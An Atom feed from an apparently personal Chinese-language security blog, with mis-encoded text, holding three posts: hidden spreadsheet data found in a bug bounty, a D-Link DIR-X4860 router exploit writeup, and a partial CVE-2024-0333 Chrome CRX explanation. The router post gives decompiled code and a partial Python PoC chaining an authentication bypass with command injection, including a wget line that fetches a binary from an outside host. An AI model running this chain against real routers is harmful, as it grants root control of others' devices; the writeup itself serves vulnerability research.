<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://AegeanYan.github.io</id>
    <title>AegeanYançš„å°é…’é¦†</title>
    <updated>2024-06-04T14:43:51.225Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://AegeanYan.github.io"/>
    <link rel="self" href="https://AegeanYan.github.io/atom.xml"/>
    <subtitle>æ­¤å¤„æœ‰å´‡å±±å³»å²­ï¼ŒèŒ‚æ—ä¿®ç«¹</subtitle>
    <logo>https://AegeanYan.github.io/images/avatar.png</logo>
    <icon>https://AegeanYan.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, AegeanYançš„å°é…’é¦†</rights>
    <entry>
        <title type="html"><![CDATA[Google sheetæ‰“å¼€ç©ºç™½xls]]></title>
        <id>https://AegeanYan.github.io/post/google-sheet-da-kai-kong-bai-xls/</id>
        <link href="https://AegeanYan.github.io/post/google-sheet-da-kai-kong-bai-xls/">
        </link>
        <updated>2024-06-04T14:43:21.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>é€šè¿‡å°†æŸç©ºç™½xlsæ ¼å¼çš„åŠ å¯†å‡­è¯ç”¨Google sheetæ‰“å¼€ï¼Œå–å¾—äº†æ„æƒ³ä¸åˆ°çš„ç ´è§£æ•ˆæœï¼Œæ¨æµ‹æ˜¯xlsä¸ŠæŸç§å¼±åŠ å¯†æ–¹å¼å—åˆ°äº†è½¯ä»¶å…¼å®¹é—®é¢˜ã€‚</p>
</blockquote>
<p>ä½œè€…åœ¨Bugcrowdæ‚¬èµçš„ç›®æ ‡ç½‘ç«™ä¸Šå¯»æ‰¾æ¼æ´æ—¶å‘ç°äº†ä¸€ä¸ªåä¸º<code>redacted.xls</code> çš„å¯ç–‘æ–‡ä»¶ï¼Œæ­£å¸¸æ‰“å¼€æ˜¯ä¸€ç‰‡ç©ºç™½ï¼Œä½¿ç”¨ç”µå­å–è¯æŠ€æœ¯ç»“æœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042224911.png" alt="" loading="lazy"></figure>
<ul>
<li>è¯¥æ–‡ä»¶Securityé¡¹æ ‡ä¸ºPassword protectedï¼Œä½†å®é™…æ‰“å¼€æ—¶æ²¡æœ‰è¾“å…¥å¯†ç </li>
<li>æ–‡ä»¶å¤§å°çº¦ä¸º16KBï¼Œä½†çœ‹ä¸Šå»æ˜¯ç©ºçš„ï¼Œå…ƒæ•°æ®ç†åº”åªå 1-2KB</li>
<li>ä½¿ç”¨OLEåŠå…¶ä»–å·¥å…·æå–æ•°æ®ä¸€æ— æ‰€è·</li>
</ul>
<p>å¥‡æ€ªçš„æ˜¯ï¼Œä½¿ç”¨Excelå’ŒLibreOfficeæ‰“å¼€è¯¥xlsæ–‡ä»¶æ—¶å‡ºç°äº†å¼‚å¸¸ç°è±¡: Excelä¸­çš„æ˜¾ç¤ºä»Jåˆ—å¼€å§‹ï¼Œè€ŒLibreOfficeä¸­ä»Låˆ—å¼€å§‹ï¼šæŸäº›è¡¨æ ¼ç±»æ•°æ®ç¡®å®è¢«éšè—äº†ã€‚</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042230121.png" alt="" loading="lazy"></figure>
<p>ç„¶è€Œï¼Œå½“ç”¨Google Sheetæ‰“å¼€å®ƒæ—¶ï¼Œæ„å¤–çš„æ˜¯å¯ä»¥å±•å¼€Jåˆ—äº†</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042232404.png" alt="" loading="lazy"></figure>
<p>éšè—ä¿¡æ¯åŒ…å«äº†å¤§é‡çš„â€œä¼ä¸šè¯¦ç»†ä¿¡æ¯â€ã€â€œç”¨æˆ·IDå’Œå¯†ç â€ã€â€œç™»å½•é¡µé¢åœ°å€â€ç­‰ã€‚</p>
<h6 id="conclusion">Conclusion</h6>
<p>è¯¥æ–‡ä»¶é‡‡å–äº†æŸç§è¿‡æ—¶çš„ç©ºç™½åŠ å¯†æ–¹å¼ä»¥è‡³äºå¸‚é¢ä¸Šçš„å–è¯æ–¹æ³•æ— æ³•è¯†åˆ«ï¼Œä½†ç”±äºå…¼å®¹æ€§é—®é¢˜ï¼Œåœ¨Google Sheetä¸­å°†å…¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DIR-X4860_D-linkè·¯ç”±å™¨0dayæ¼æ´]]></title>
        <id>https://AegeanYan.github.io/post/dir-x4860_d-link-lu-you-qi-0day-lou-dong/</id>
        <link href="https://AegeanYan.github.io/post/dir-x4860_d-link-lu-you-qi-0day-lou-dong/">
        </link>
        <updated>2024-05-22T04:34:25.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>D-Linkæ˜¯ä¸€å®¶å°æ¹¾ä¼ä¸šï¼Œä¸»è¦äº§å“æ˜¯äº¤æ¢æœºã€è·¯ç”±å™¨ç­‰ç½‘ç»œäº§å“ï¼Œä½†å…¶äº§å“æ›å‡ºå¤šä¸ªå®‰å…¨æ¼æ´ï¼Œä»…2024.4å…¶NASäº§å“å°±æ›å‡ºäº†CVE-2024-3272ã€CVE-2024-3273æ¼æ´ã€‚ä¸”D-Linkå¯¹å¾…è¿™äº›æ¼æ´æ¯”è¾ƒæ¶ˆæã€‚</p>
<p>DIR-X4860 ä¸­çš„å®‰å…¨æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…è®¿é—® HNAP ç«¯å£ä»¥è·å¾—æå‡çš„æƒé™ï¼Œå¹¶ä»¥<code>root</code>èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ã€‚é€šè¿‡å°†èº«ä»½éªŒè¯ç»•è¿‡ä¸å‘½ä»¤æ‰§è¡Œç›¸ç»“åˆï¼Œè®¾å¤‡å¯èƒ½ä¼šè¢«å®Œå…¨ç ´åã€‚è¯¥æ¼æ´å°šæœªè¢«é‡è§†ã€‚</p>
</blockquote>
<p><strong>å‘ç°è€…ï¼š</strong> SSD Secure Disclosureçš„å®‰å…¨ç ”ç©¶äººå‘˜</p>
<p><strong>ä¾›åº”å•†å›åº”ï¼š</strong> è¿‡å»ä¸€ä¸ªæœˆä¸­ä»–ä»¬å·²è”ç³»ä¾›åº”å•†3æ¬¡ï¼Œä½†æœªæ”¶åˆ°å›åº”ã€‚</p>
<p><strong>å—å½±å“ç‰ˆæœ¬ï¼š</strong> è¿è¡Œ<code>DIRX4860A1_FWV1.04B03</code>å›ºä»¶çš„DIR-x4860</p>
<p><strong>æ¼æ´æˆå› ï¼š</strong> å›ºä»¶åœ¨HNAPåè®®ä¸Šå¯¹èº«ä»½éªŒè¯ç®—æ³•å®æ–½çš„ä¸æ­£ç¡®</p>
<h6 id="hnapåè®®">HNAPåè®®</h6>
<p>**Step 1:**å‘é€loginè¯·æ±‚å¹¶ç­‰å¾…å“åº”</p>
<pre><code>Headers:
&quot;Content-Type&quot;: &quot;text/xml; charset=utf-8&quot;
&quot;SOAPAction&quot;: &quot;http://purenetworks.com/HNAP1/Login&quot;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soap:Body&gt;
    &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
      &lt;Action&gt;request&lt;/Action&gt;
      &lt;Username&gt;Admin&lt;/Username&gt; //Adminæ˜¯é»˜è®¤ç®¡ç†å‘˜è´¦æˆ·
      &lt;LoginPassword/&gt;
      &lt;Captcha/&gt;
    &lt;/Login&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
<p>å“åº”æ•°æ®</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soap:Body&gt;
    &lt;LoginResponse xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
      &lt;LoginResult&gt;OK&lt;/LoginResult&gt;
      &lt;Challenge&gt;........&lt;/Challenge&gt;
      &lt;Cookie&gt;........&lt;/Cookie&gt;
      &lt;PublicKey&gt;........&lt;/PublicKey&gt;
    &lt;/LoginResponse&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
<p>Cookieé¡¹ç”¨äºå¡«å……åç»­æ‰€æœ‰HTTPè¯·æ±‚ï¼ŒChallengeå’ŒPublicKeyç”¨äºè®¡ç®—HNAP_AUTHä½œä¸ºHTTPåŒ…å¤´çš„èº«ä»½éªŒè¯</p>
<pre><code class="language-pseudocode">LoginPassword:
PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid :
uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = &quot;http://purenetworks.com/HNAP1/&quot;
    Action = &quot;Login&quot;
    SOAPAction = '&quot;' + SOAP_NAMESPACE2 + Action + '&quot;'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
</code></pre>
<p>**Step 2:**å‘é€æ­£å¼loginå¹¶ç­‰å¾…å“åº”</p>
<pre><code class="language-xml">Headers:
&quot;Content-Type&quot;: &quot;text/xml; charset=utf-8&quot;
&quot;SOAPAction&quot;: &quot;http://purenetworks.com/HNAP1/Login&quot;
&quot;HNAP_AUTH&quot;: &quot;........&quot;
&quot;Cookie&quot;: &quot;uid=........&quot; //é»˜è®¤å¡«å……
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soap:Body&gt;
    &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
      &lt;Action&gt;login&lt;/Action&gt;
      &lt;Username&gt;Admin&lt;/Username&gt;
      &lt;LoginPassword&gt;........&lt;/LoginPassword&gt;
      &lt;Captcha/&gt;
    &lt;/Login&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
<p>å“åº”æ•°æ®</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soap:Body&gt;
    &lt;LoginResponse xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
      &lt;LoginResult&gt;success&lt;/LoginResult&gt;//successä»£è¡¨æˆåŠŸ
    &lt;/LoginResponse&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
<h6 id="èº«ä»½æ¼æ´">èº«ä»½æ¼æ´</h6>
<p>åœ¨<code>/bin/prog.cgi</code>æ–‡ä»¶ä¸­å‘ç°æ¼æ´</p>
<pre><code class="language-c">int __fastcall sub_5394C(int a1, int a2, int a3, int a4)
{
  int v5; // r1
  char *v6; // r0
  const char *v7; // r5
  const char *v8; // r5
  int v10; // r0
  int v11; // r1
  int v12; // r2
  int v13; // r3
  sub_53074(a1, a2, a3, a4);
  if ( sub_51038(a1) )
  {
    v6 = GetHNAPParam(a1, &quot;/Login/Action&quot;);
    v7 = v6;
    if ( v6 )
    {
      if ( !strncmp(v6, &quot;request&quot;, 7u) )
      {
        handle_login_request(a1); // into here !!!
        return 1;
      }
      ******
}
int __fastcall handle_login_request(int a1)
{
  char *Username; // r11
  int v3; // r5
  int result; // r0
  const char *PrivateLogin; // [sp+Ch] [bp-84h]
  char s[64]; // [sp+10h] [bp-80h] BYREF
  char v7[64]; // [sp+50h] [bp-40h] BYREF
  char v8[64]; // [sp+90h] [bp+0h] BYREF
  char http_password[64]; // [sp+D0h] [bp+40h] BYREF
  char v10[128]; // [sp+110h] [bp+80h] BYREF
  memset(s, 0, sizeof(s));
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  memset(http_password, 0, sizeof(http_password));
  memset(v10, 0, sizeof(v10));
  if ( sub_51FE4(a1) )
  {
    sub_5322C(a1, 5);
    result = 0;
  }
  else
  {
    GetHNAPParam(a1, &quot;/Login/Action&quot;);
    Username = GetHNAPParam(a1, &quot;/Login/Username&quot;);
    GetHNAPParam(a1, &quot;/Login/LoginPassword&quot;);
    GetHNAPParam(a1, &quot;/Login/Captcha&quot;);
    PrivateLogin = GetHNAPParam(a1, &quot;/Login/PrivateLogin&quot;);
    sub_50F98(s, 20);
    sub_50F98(v7, 10);
    sub_50F98(v8, 20);
    if ( PrivateLogin &amp;&amp; !strncmp(PrivateLogin, &quot;Username&quot;, 8u) )
      strncpy(http_password, Username, 0x40u); // Authentication Bypass!!
    else
      get_http_password(http_password, 0x40u);
    sub_51284(s, http_password, v8, v10, 128);
    v3 = sub_51468(a1, v10, s, v7, v8);
    sub_51094(a1, v7);
    sub_5322C(a1, 0);
    result = v3;
  }
  return result;
}
</code></pre>
<p>å¦‚æœåŒ…å«&quot;PrivateLogin&quot;å…³é”®è¯ä¸”ä¸&quot;Username&quot;ç›¸åŒï¼Œå°±ä¼šç›´æ¥å°†ç”¨æˆ·åä½œä¸ºå¯†é’¥éªŒè¯</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨&quot;Admin&quot;ä½œä¸ºå¯†ç </p>
<pre><code class="language-pseudocode">LoginPassword:
password = â€Admin&quot;
PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid :
uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = &quot;http://purenetworks.com/HNAP1/&quot;
    Action = &quot;Login&quot;
    SOAPAction = '&quot;' + SOAP_NAMESPACE2 + Action + '&quot;'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
</code></pre>
<h6 id="åˆ©ç”¨é“¾">åˆ©ç”¨é“¾ï¼š</h6>
<p><em>D-Link DIR-X4860 SetVirtualServerSettings LocalIPAddress Command Injection Remote Code Execution</em></p>
<p><code>/bin/prog.cgi</code>ä¸­çš„å‡½æ•°<code>SetVirtualServerSettings</code>å­˜åœ¨æ¼æ´</p>
<pre><code class="language-c">void __fastcall SetVirtualServerSettings(int a1)
{
      ******
      log_log(7, &quot;SetVirtualServerSettings&quot;, 599, &quot;pProtocolNumber=%s\n&quot;, v19);
      snprintf(v20, 0x100u, &quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&quot;, v3, &quot;LocalIPAddress&quot;);
      LocalIPAddress_v16 = GetHNAPParam(a1, v20);
      if ( !LocalIPAddress_v16 )
      {
        v5 = 604;
        goto LABEL_9;
      }
      log_log(7, &quot;SetVirtualServerSettings&quot;, 606, &quot;pLocalIPAddress=%s\n&quot;, LocalIPAddress_v16);
      snprintf(v20, 0x100u, &quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&quot;, v3, &quot;ScheduleName&quot;);
      v8 = GetHNAPParam(a1, v20);
      if ( !v8 )
      {
        v5 = 611;
        goto LABEL_9;
      }
      if ( !strcmp(s1, &quot;true&quot;)
        &amp;&amp; !strcmp(v13, &quot;9&quot;)
        &amp;&amp; !strcmp(v7, &quot;UDP&quot;)
        &amp;&amp; FCGI_popen_v1(LocalIPAddress_v16, v13, v7, s, ++v14) == -1 ) // into here !!!
      {
        v5 = 620;
        goto LABEL_9;
      }
      ******
}
int __fastcall FCGI_popen_v1(const char *LocalIPAddress, int a2, int a3, char *a4, int a5)
{
  int v7; // r0
  int v8; // r6
  char v10[20]; // [sp+Ch] [bp-14h] BYREF
  char v11[64]; // [sp+20h] [bp+0h] BYREF
  char v12[68]; // [sp+60h] [bp+40h] BYREF
  memset(v11, 0, sizeof(v11));
  memset(v10, 0, 0x12u);
  memset(v12, 0, 0x40u);
  snprintf(v12, 0x40u, &quot;arp | grep %s | awk '{printf $4}'&quot;, LocalIPAddress);
  v7 = FCGI_popen(v12, &quot;r&quot;); // rce !!!
  ******
}
</code></pre>
<p>é€šè¿‡ç¯¡æ”¹<code>LocalIPAddress</code>å³å¯åœ¨rootä¸Šä¸‹æ–‡æ‰§è¡Œå‘½ä»¤</p>
<h6 id="part-of-poc">Part of PoC</h6>
<pre><code class="language-c">def login_request(ip, port, https):
    &quot;&quot;&quot;login_result&quot;&quot;&quot;
    xml_post = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soap:Body&gt;
        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
            &lt;Action&gt;request&lt;/Action&gt;
            &lt;Username&gt;Admin&lt;/Username&gt;
            &lt;PrivateLogin&gt;Username&lt;/PrivateLogin&gt;
            &lt;login_password&gt;&lt;/login_password&gt;
            &lt;Captcha&gt;&lt;/Captcha&gt;
        &lt;/Login&gt;
    &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;&quot;&quot;&quot;
    headers = {
        &quot;Host&quot;: ip,
        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/Login&quot;',
        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
    }
    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, xml_post)
    if challenge == b&quot;&quot;:
        print(&quot;[-] get Challenge error&quot;)
        sys.exit(0)
    return challenge, cookie, public_key

def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
    &quot;&quot;&quot;login_login&quot;&quot;&quot;
    xml_post = f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soap:Body&gt;
        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
            &lt;Action&gt;login&lt;/Action&gt;
            &lt;Username&gt;Admin&lt;/Username&gt;
            &lt;LoginPassword&gt;{login_password}&lt;/LoginPassword&gt;
            &lt;Captcha&gt;&lt;/Captcha&gt;
        &lt;/Login&gt;
    &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;&quot;&quot;&quot;
    headers = {
        &quot;Host&quot;: ip,
        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
        &quot;HNAP_AUTH&quot;: f&quot;{hnap_auth} {time_now}&quot;,
        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/Login&quot;',
        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
        &quot;Cookie&quot;: f&quot;uid={cookie}&quot;,
    }
    send_http(ip, port, https, headers, xml_post)
def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
    &quot;&quot;&quot;set_virtual_server_settings&quot;&quot;&quot;
    xml_post = f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soap:Body&gt;
        &lt;SetVirtualServerSettings xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
            &lt;VirtualServerList&gt;
                &lt;VirtualServerInfo&gt;
                    &lt;Enabled&gt;true&lt;/Enabled&gt;
                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;//å°†IPæ›¿æ¢æˆæ³¨å…¥å‘½ä»¤
                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
                &lt;/VirtualServerInfo&gt;
                &lt;VirtualServerInfo:0&gt;
                    &lt;Enabled&gt;true&lt;/Enabled&gt;
                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;
                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
                &lt;/VirtualServerInfo:0&gt;
                &lt;VirtualServerInfo:1&gt;
                    &lt;Enabled&gt;true&lt;/Enabled&gt;
                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;
                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
                &lt;/VirtualServerInfo:1&gt;
            &lt;/VirtualServerList&gt;
        &lt;/SetVirtualServerSettings&gt;
    &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;&quot;&quot;&quot;
    headers = {
        &quot;Host&quot;: ip,
        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
        &quot;HNAP_AUTH&quot;: f&quot;{hnap_auth} {time_now}&quot;,
        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/SetVirtualServerSettings&quot;',
        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
        &quot;Cookie&quot;: f&quot;uid={cookie}&quot;,
    }
    send_http(ip, port, https, headers, xml_post)
def exploit():
  dummy_password = &quot;Admin&quot;
  private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
  login_password = get_hmac_key_md5(private_key, challenge)
  print(f&quot;[+] login_password : {login_password}&quot;)
  soap_namespace2 = &quot;http://purenetworks.com/HNAP1/&quot;
  action = &quot;Login&quot;
  soap_action = f'&quot;{soap_namespace2}{action}&quot;'
  print(f&quot;[+] SOAPAction : {soap_action}&quot;)
  time_now = int(round(time.time() * 1000))
  time_now = math.floor(time_now) % 2000000000000
  time_now = &quot;%d&quot; % time_now
  print(f&quot;[+] Time : {time_now}&quot;)
  hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
  print(f&quot;[+] HNAP_AUTH : {hnap_auth}&quot;)
  login_login(
      target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie
  )
    
  cmd = &quot;1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA&quot;
  set_virtual_server_settings(
      target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
  )
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Chrome extension CRXæ–‡ä»¶æ ¼å¼è§£å‹é—®é¢˜]]></title>
        <id>https://AegeanYan.github.io/post/cve-2024-0333-chrome-extension/</id>
        <link href="https://AegeanYan.github.io/post/cve-2024-0333-chrome-extension/">
        </link>
        <updated>2024-05-08T04:34:51.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2024-0333-chrome-extension">CVE-2024-0333 Chrome extension</h1>
<blockquote>
<p>Chromiumåœ¨æ£€æŸ¥æµè§ˆå™¨ç»„å»ºæ–‡ä»¶æ—¶ï¼Œç”±äºZIP32ä½å’ŒZIP64ä½çš„é—ç•™é—®é¢˜ï¼Œåœ¨EOFç¬¦å·å¤„äº§ç”Ÿæ­§ä¹‰å’Œé€»è¾‘é”™è¯¯ï¼ˆå¯èƒ½æ˜¯ä¸ºäº†æ•ˆç‡ï¼‰ï¼Œè¾“å…¥éªŒè¯ä¸è¶³ï¼Œå¯¼è‡´å¯ä»¥å¯¹64KBå¤§å°ä»¥ä¸‹çš„æ‰©å±•ç¨‹åºå’Œæµè§ˆå™¨ç»„ä»¶è¿›è¡Œæ³¨å…¥å’Œææƒ</p>
</blockquote>
<p>**CVSSç­‰çº§ï¼š**5.3</p>
<p>**å—å½±å“åº”ç”¨ï¼š**Google chrome &lt;= 120.0.6099.216</p>
<p><strong>æ¼æ´å½±å“é¢ï¼š</strong> å¾ˆå°ï¼Œåœ¨Chromeæ’ä»¶å¸‚åœºå’ŒChromeè‡ªèº«ç»„ä»¶ä¸­æ²¡æœ‰ï¼Œä»…å¯èƒ½å¯¹ä¼ä¸šè‡ªå®šä¹‰æ’ä»¶æœ‰å½±å“</p>
<h4 id="æ¼æ´ä»‹ç»">æ¼æ´ä»‹ç»</h4>
<hr>
<p>Chromiumæ‰€æœ‰æ‰©å±•å’Œå¤§å¤šæ•°æµè§ˆå™¨ç»„ä»¶æ›´æ–°éƒ½ä½¿ç”¨ CRX æ–‡ä»¶æ ¼å¼ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ª<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)">ZIP æ–‡ä»¶</a>ï¼Œå‰é¢å¸¦æœ‰åŒ…å«ç­¾åå’Œå…¶ä»–å…ƒæ•°æ®çš„æ ‡å¤´ï¼Œä»¥ä¿è¯æ–‡ä»¶å®Œæ•´æ€§ã€‚</p>
<p><u>Google Chrome Elevation Service</u>å¯ä»¥è·å–ä½ç‰¹æƒçš„å¯æ‰§è¡Œæ–‡ä»¶å¹¶ä»¥è¾ƒé«˜çš„ç‰¹æƒè¿è¡Œå®ƒï¼Œå¯ä»¥ç”¨äºå®‰è£…æŸäº›æ›´æ–°ã€‚å…¶é€šè¿‡ä¸‹åˆ—è¿‡ç¨‹æ¥é˜²æ­¢è¢«ç¯¡æ”¹ï¼š</p>
<ul>
<li>å°†ç”¨æˆ·æŒ‡å®šçš„CRXæ–‡ä»¶å¤åˆ¶åˆ°å—ä¿¡ä»»çš„ä½ç½®ï¼ˆä½æƒé™ç”¨æˆ·æ— æƒå°†ä»»ä½•å…¶ä»–æ–‡ä»¶æ³¨å…¥å—ä¿¡ä»»ä½ç½®ï¼‰</li>
<li><strong>å¯¹æ–‡ä»¶æ‰§è¡Œç­¾åéªŒè¯</strong>ï¼ˆä»»ä½•ç¯¡æ”¹å‹ç¼©å¯æ‰§è¡Œæ–‡ä»¶çš„å°è¯•éƒ½ä¼šä½¿ç­¾åæ— æ•ˆå¹¶é˜»æ­¢å…¶è¿è¡Œï¼‰</li>
<li>è§£å‹ç¼©</li>
<li>è¿è¡Œæå–çš„å¯æ‰§è¡Œæ–‡ä»¶</li>
</ul>
<p>**ç»•è¿‡ç­¾åéªŒè¯æ˜¯å¯èƒ½çš„ï¼š**CRXæ–‡ä»¶æ ¼å¼å­˜åœ¨ç€å‘æ–‡ä»¶å¤´ï¼ˆheaderï¼‰æ³¨å…¥é¢å¤–æ•°æ®çš„å¯èƒ½æ€§ï¼Œä¸”æ–‡ä»¶å¤´æœ¬èº«åŒ…å«çš„å¤§éƒ¨åˆ†æ•°æ®æ— éœ€ç»è¿‡éªŒè¯ã€‚ZIPç”±äºå¹´ä»£ä¹…è¿œæœ‰ZIP32å’ŒZIP64ï¼ˆå¤§äº4GBï¼‰ä¸¤ç§æ ¼å¼ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„EOFç¬¦å·</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/CVE-2024-0333.jpeg" alt="CVE-2024-0333" loading="lazy"></figure>
